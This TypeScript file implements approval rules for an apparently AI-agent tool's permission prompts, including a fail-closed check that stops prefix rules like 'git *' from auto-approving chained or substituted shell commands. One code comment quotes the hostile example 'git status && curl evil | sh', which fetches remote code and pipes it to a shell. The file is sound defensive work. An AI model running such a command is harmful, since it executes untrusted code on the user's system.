import * as fs from 'node:fs';
import * as path from 'node:path';
import * as crypto from 'node:crypto';
import type { PermissionRequest } from '@github/copilot-sdk';

export interface ApprovalRule {
	id: string;
	sessionId: string;
	kind: string;
	pattern: string;
	createdAt: number;
}

/** Returns true if `cmd` is a single, simple shell command with no unquoted
 *  control operators or command substitution — i.e. honoring a `prefix *`
 *  approval rule (e.g. `git *`) for it cannot smuggle in a second command.
 *
 *  Quoted regions are respected: literal operators inside quotes are fine
 *  (`git commit -m "a && b"` stays simple), but command substitution — `$(...)`
 *  or backticks — is dangerous even inside double quotes, so it is rejected.
 *  Fails closed: anything ambiguous (unbalanced quotes, redirection, chaining,
 *  newlines, subshells) returns false, which means the human gate is shown. */
export function isSimpleSingleCommand(cmd: string): boolean {
	let inSingle = false, inDouble = false;
	for (let i = 0; i < cmd.length; i++) {
		const c = cmd[i];
		if (inSingle) {
			if (c === "'") inSingle = false;
			continue;
		}
		if (inDouble) {
			if (c === '\\') { i++; continue; }                 // backslash escape
			if (c === '"') { inDouble = false; continue; }
			if (c === '`') return false;                        // cmd-subst in dquotes
			if (c === '$' && cmd[i + 1] === '(') return false;  // $(...) in dquotes
			continue;
		}
		// unquoted
		if (c === '\\') { i++; continue; }
		if (c === "'") { inSingle = true; continue; }
		if (c === '"') { inDouble = true; continue; }
		if (c === '`') return false;
		if (c === '$' && cmd[i + 1] === '(') return false;
		if (c === '\n' || c === '\r') return false;
		if (';|&<>(){}'.includes(c)) return false;
	}
	if (inSingle || inDouble) return false;                     // unbalanced quotes
	return true;
}

export class RulesStore {
	private rulesDir: string;
	private cache = new Map<string, ApprovalRule[]>();
	private approveAllCache = new Map<string, boolean>();

	constructor(dataDir: string) {
		this.rulesDir = path.join(dataDir, 'rules');
	}

	/** Computes a human-readable pattern that describes what the rule will match.
	 *  Returns undefined if no sensible pattern can be derived. */
	static computePattern(req: PermissionRequest): string | undefined {
		const r = req as PermissionRequest & {
			fullCommandText?: string;
			path?: string; filePath?: string; file?: string; fileName?: string; resource?: string; target?: string;
			url?: string;
			toolName?: string;
			serverName?: string;
			subject?: string;
		};
		switch (req.kind) {
			case 'shell': {
				const cmd = r.fullCommandText?.trim() ?? '';
				// Strip leading comments and blank lines
				const lines = cmd.split(/\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
				const firstLine = lines[0] ?? '';
				const baseCmd = firstLine.split(/\s+/)[0] ?? '';
				// Reject empty, shell operators, or obviously non-command tokens
				if (!baseCmd || /^[#;|&<>(){}\[\]$!`"']/.test(baseCmd)) return undefined;
				return `${baseCmd} *`;
			}
			case 'read':
			case 'write': {
				const filePath = r.path ?? r.filePath ?? r.file ?? r.fileName ?? r.resource ?? r.target ?? req.kind;
				const dir = path.dirname(filePath);
				return dir && dir !== '.' ? path.join(dir, '*') : filePath;
			}
			case 'mcp': {
				const server = r.serverName ?? '*';
				const tool = r.toolName ?? '*';
				return `${server}/${tool}`;
			}
			case 'url': {
				try { return new URL(r.url ?? '').hostname; } catch { return r.url ?? req.kind; }
			}
			case 'memory' as string:
				return r.subject ?? 'memory';
			default:
				return r.toolName ?? req.kind;
		}
	}

	getRules(sessionId: string): ApprovalRule[] {
		if (!this.cache.has(sessionId)) {
			this.cache.set(sessionId, this.load(sessionId).rules);
		}
		return this.cache.get(sessionId)!;
	}

	getApproveAll(sessionId: string): boolean {
		// Ensure file is loaded into cache
		this.getRules(sessionId);
		return this.approveAllCache.get(sessionId) ?? false;
	}

	setApproveAll(sessionId: string, enabled: boolean): void {
		this.approveAllCache.set(sessionId, enabled);
		this.save(sessionId, this.getRules(sessionId), enabled);
	}

	addRule(sessionId: string, kind: string, pattern: string): ApprovalRule {
		const rules = this.getRules(sessionId);
		const existing = rules.find(r => r.kind === kind && r.pattern === pattern);
		if (existing) return existing;
		const rule: ApprovalRule = { id: crypto.randomBytes(8).toString('hex'), sessionId, kind, pattern, createdAt: Date.now() };
		rules.push(rule);
		this.save(sessionId, rules);
		return rule;
	}

	removeRule(sessionId: string, ruleId: string): void {
		const rules = this.getRules(sessionId).filter(r => r.id !== ruleId);
		this.cache.set(sessionId, rules);
		this.save(sessionId, rules);
	}

	clearRules(sessionId: string): void {
		this.cache.set(sessionId, []);
		this.save(sessionId, []);
	}

	/** Returns the first matching rule for this request, or null if none. */
	matchesRequest(sessionId: string, req: PermissionRequest): ApprovalRule | null {
		const r = req as PermissionRequest & {
			fullCommandText?: string;
			path?: string; filePath?: string; file?: string; fileName?: string; resource?: string; target?: string;
			url?: string;
			toolName?: string;
			serverName?: string;
			subject?: string;
		};
		for (const rule of this.getRules(sessionId)) {
			if (rule.kind !== req.kind) continue;
			switch (req.kind) {
				case 'shell': {
					const base = rule.pattern.replace(/\s+\*$/, '');
					const cmd = r.fullCommandText?.trim() ?? '';
					// bare '*' pattern means allow any shell command (explicit blanket approval)
					if (base === '*') return rule;
					// A prefix rule (e.g. `git *`) must only auto-approve a single simple
					// command. Reject compound/chained/substituted commands so that
					// `git status && curl evil | sh` is NOT silently approved by `git *`.
					if (!isSimpleSingleCommand(cmd)) break;
					if (cmd === base || cmd.startsWith(base + ' ')) return rule;
					break;
				}
				case 'read':
				case 'write': {
					const filePath = r.path ?? r.filePath ?? r.file ?? r.fileName ?? r.resource ?? r.target;
					if (rule.pattern === filePath) return rule;
					// dir\* pattern — match any file directly in that directory
					const dirWildcard = path.sep + '*';
					if (rule.pattern.endsWith(dirWildcard)) {
						const dir = rule.pattern.slice(0, -dirWildcard.length);
						if (filePath && path.dirname(filePath) === dir) return rule;
					}
					break;
				}
				case 'mcp': {
					const [ruleServer, ruleTool] = rule.pattern.split('/');
					if ((ruleServer === '*' || ruleServer === r.serverName) &&
						(ruleTool === '*' || ruleTool === r.toolName)) return rule;
					break;
				}
				case 'url': {
					try {
						if (rule.pattern === new URL(r.url ?? '').hostname) return rule;
					} catch {}
					break;
				}
				case 'memory' as string:
					if (rule.pattern === (r.subject ?? 'memory')) return rule;
					break;
				default:
					if (rule.pattern === (r.toolName ?? req.kind)) return rule;
			}
		}
		return null;
	}

	removeSession(sessionId: string): void {
		this.cache.delete(sessionId);
		this.approveAllCache.delete(sessionId);
	}

	private load(sessionId: string): { rules: ApprovalRule[]; approveAll: boolean } {
		try {
			if (!/^[A-Za-z0-9_-]+$/.test(sessionId)) return { rules: [], approveAll: false };
			const f = path.join(this.rulesDir, `${sessionId}.json`);
			if (fs.existsSync(f)) {
				const data = JSON.parse(fs.readFileSync(f, 'utf8'));
				// Support both old format (plain array) and new format ({ rules, approveAll })
				if (Array.isArray(data)) {
					return { rules: data, approveAll: false };
				}
				this.approveAllCache.set(sessionId, !!data.approveAll);
				return { rules: data.rules ?? [], approveAll: !!data.approveAll };
			}
		} catch {}
		return { rules: [], approveAll: false };
	}

	private save(sessionId: string, rules: ApprovalRule[], approveAll?: boolean): void {
		if (!/^[A-Za-z0-9_-]+$/.test(sessionId)) return;
		const yolo = approveAll ?? this.approveAllCache.get(sessionId) ?? false;
		try {
			fs.mkdirSync(this.rulesDir, { recursive: true });
			fs.writeFileSync(path.join(this.rulesDir, `${sessionId}.json`), JSON.stringify({ rules, approveAll: yolo }, null, 2));
		} catch {}
	}
}
